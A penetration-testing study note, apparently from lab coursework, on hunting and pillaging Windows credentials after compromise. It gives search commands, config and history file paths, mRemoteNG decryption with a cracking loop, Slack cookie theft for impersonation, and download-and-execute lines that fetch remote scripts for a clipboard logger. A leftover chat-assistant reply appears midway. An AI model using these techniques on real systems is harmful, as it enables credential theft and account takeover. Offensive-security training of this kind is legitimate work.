# Credential Hunting

Credential hunting during privilege escalation can uncover local administrator access, lateral movement vectors, or domain credentials. Windows often leaks credentials in files, memory, or through poorly secured automation artifacts.

This note focuses on the most common manual techniques for credential discovery post-compromise.
## 1. Application Configuration Files

Many applications store credentials insecurely in plaintext or poorly encoded formats.

Use `findstr` to recursively search files:

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

Check default web paths:

```powershell
C:\inetpub\wwwroot\web.config
```

Also look for legacy configurations in backups, user folders, and deployment artifacts.
## 2. Dictionary Files (Chrome Custom Dictionary)

Chrome users sometimes save sensitive words into their personal dictionary:

```powershell
gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

Look for passwords added to bypass red underline.
## 3. Unattended Installation Files

Unattended XML files often store passwords in plaintext or base64:

```xml
<AutoLogon>
  <Username>Administrator</Username>
  <Password>
    <Value>local_4dmin_p@ss</Value>
    <PlainText>true</PlainText>
  </Password>
</AutoLogon>
```

Common paths:

- `C:\unattend.xml`    
- `C:\Windows\Panther\Unattend\Unattend.xml`
- Anywhere in development folders
## 4. PowerShell History File

PowerShell 5+ stores command history in:

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Confirm location:

```powershell
(Get-PSReadLineOption).HistorySavePath
```

Example credential leakage:

```powershell
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin!
```

Enumerate all accessible users’ history:

```powershell
foreach ($user in (Get-ChildItem C:\Users).Name) {
  Get-Content "C:\Users\$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
```
## 5. PowerShell Exported Credentials (Clixml / DPAPI)

Exported PowerShell credentials (e.g. via `Export-Clixml`) are encrypted using DPAPI and can only be decrypted by the same user on the same system.

Script example:

```powershell
$creds = Import-Clixml -Path 'C:\scripts\pass.xml'
$creds.GetNetworkCredential().Username
$creds.GetNetworkCredential().Password
```

Output (if user context matches):

```
bob
Str0ng3ncryptedP@ss!
```

Stored credentials are commonly used in:

- Automation scripts (`Connect-VC.ps1`, `Connect-SPOService`, etc.)
- Scheduled Tasks
- Remote session setups
## Summary

| Location                | What to Look For                       |
| ----------------------- | -------------------------------------- |
| *.config, *.xml, *.ini  | Plaintext creds, connection strings    |
| Custom Dictionary.txt   | Added passwords                        |
| Unattend.xml            | AutoLogon / account provisioning creds |
| ConsoleHost_history.txt | Saved PowerShell command-line creds    |
| Exported Clixml XML     | DPAPI-encrypted credentials            |

Recheck all these locations post-privilege escalation to extract credentials from other users, now accessible with SYSTEM or admin rights.
## 6. Other Files & Artifacts

Credentials are often scattered in non-obvious or undocumented places across local systems and share drives. Manual hunting and recursive file analysis can reveal:

- Sensitive files forgotten by users
- Legacy artifacts from application deployment
- Commonly misconfigured enterprise share structures
### 6.1 File Share Drives and Local File Systems

Use manual enumeration or tools like Snaffler to scan for:

- `.kdbx`, `.ppk`, `.vhdx`, `.vmdk` (KeePass, SSH keys, virtual drives)    
- `passwords.txt`, `credentials.xlsx`, OneNote databases

Common enterprise mistake:  
Loose read permissions on user shares (e.g., `\\FILE01\users\bjones`) allowing Domain Users to read all folders.
### 6.2 Manual File Content Search (CMD)

```cmd
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
### 6.3 Manual File Content Search (PowerShell)

```powershell
Select-String -Path C:\Users\htb-student\Documents\*.txt -Pattern password
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```
### 6.4 Sticky Notes (plum.sqlite)

Sticky Notes stores data in SQLite format and is often overlooked.

Location:

```
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

Method 1: DB Browser (GUI)

- Copy `plum.sqlite`, `.shm`, and `.wal` to local box    
- Open with DB Browser for SQLite
- Run: `SELECT Text FROM Note`

Method 2: PowerShell with PSSQLite

```powershell
Import-Module .\PSSQLite.psd1
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note"
```

Method 3: Linux with strings

```bash
strings plum.sqlite-wal | grep -i password
```
### 6.5 Other Interesting File Paths

These files may contain credentials, leftover config states, or logged secrets.

System-wide:

```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
```

User Profile / Temp Artifacts:

```
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Other:

```
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```
### Summary Table

| Category                | Details/Tools                              |
| ----------------------- | ------------------------------------------ |
| Share Drive Leakage     | Look for `.ppk`, `.kdbx`, `.vhdx`, `*.txt` |
| findstr / select-string | Manual keyword search                      |
| Sticky Notes            | `plum.sqlite`, PSSQLite, strings           |
| System Config Files     | `NetSetup.log`, `.sav`, `pagefile.sys`     |
| AD Share Dumping        | Tools like Snaffler, SharpShares           |
Let me know when you're ready with the next module.

Acknowledged. Here's the complete continuation of your note, appending to `🟠 6. Credential Hunting.md`, starting right after the existing sections.
## 7. Pillaging

Pillaging is the process of extracting valuable information from a compromised system. This includes credentials, infrastructure details, backups, internal documents, and any intelligence useful for lateral movement or privilege escalation.

Effective pillaging can reveal:

- Stored passwords and tokens    
- Backup archives containing sensitive configs or hashes
- IM client data
- Network or infrastructure blueprints
- Deployment keys and certificates
### 7.1 Data Sources of Interest

Common sources where valuable data may be found:

- Installed Applications & Services    
- File Shares & Network Drives
- Virtualization or Backup Software
- Instant Messaging Clients (Slack, Teams)
- Configuration Files (XML, INI, PS1)
- Clipboard Contents
- Sticky Notes & OneNote
- Source Code, Deployment Scripts
- Historical Audit Reports

A red teamer or pentester should learn to profile enterprise environments to determine what kind of data is typically exposed in those specific tools or services.
### 7.2 Enumerating Installed Applications

Installed apps often contain hardcoded credentials, stored sessions, or integration keys.

Quick DIR check:

```cmd
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

PowerShell Registry Enumeration:

```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED | ?{ $_.DisplayName -ne $null } | Sort-Object DisplayName -Unique | Format-Table -AutoSize
```
### 7.3 mRemoteNG Credential Extraction

Location:

```
%APPDATA%\mRemoteNG\confCons.xml
```

If no master password is set, the config can be decrypted with:

```bash
python3 mremoteng_decrypt.py -s "<EncryptedPassword>"
```

With known master password:

```bash
python3 mremoteng_decrypt.py -s "<EncryptedPassword>" -p admin
```

Crack loop using wordlist:

```bash
for pw in $(cat wordlist.txt); do
  python3 mremoteng_decrypt.py -s "<Encrypted>" -p $pw
done
```
### 7.4 Slack Token Extraction from Browsers
#### Firefox:

```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

Use `cookieextractor.py`:

```bash
python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
```

Import into Cookie Editor extension to impersonate the user.
#### Chrome/Edge (DPAPI Protected):

1. Copy cookies DB to expected path:    

```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

2. Use SharpChromium (via Invoke-SharpChromium.ps1):

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://...Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"
```
### 7.5 Clipboard Monitoring

Admins often paste credentials from password managers or 2FA tokens.

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

Wait and capture sensitive content passively.
### 7.6 Backup Systems (Restic Example)

Backups may contain the full filesystem — including:

- SAM & SYSTEM hives    
- Application config
- Shadow copies

Restic backup example:

```powershell
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic\ backup C:\SampleFolder
```

View snapshots:

```powershell
restic.exe -r E:\restic\ snapshots
```

Restore snapshot:

```powershell
restic.exe -r E:\restic\ restore <SnapshotID> --target C:\Restore
```

If `--use-fs-snapshot` fails due to permission issues, attempt from SYSTEM context or escalate further.
## Summary Table

| Vector         | Description                                     |
| -------------- | ----------------------------------------------- |
| Installed Apps | Check configs, logs, DB connections             |
| mRemoteNG      | Decrypt stored credentials                      |
| IM Clients     | Extract Slack tokens from browser DB            |
| Clipboard      | Capture pasted passwords or URLs                |
| Backups        | Restore snapshots and dump sensitive data       |
| Sticky Notes   | `plum.sqlite` often contains plaintext secrets  |
| File Shares    | `.kdbx`, `.vhdx`, `.ppk`, `passwords.txt`, etc. |
### CHECKOUT : [[🟡 1. Credential Manager & DPAPI✔️]]

# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Credential_Hunting 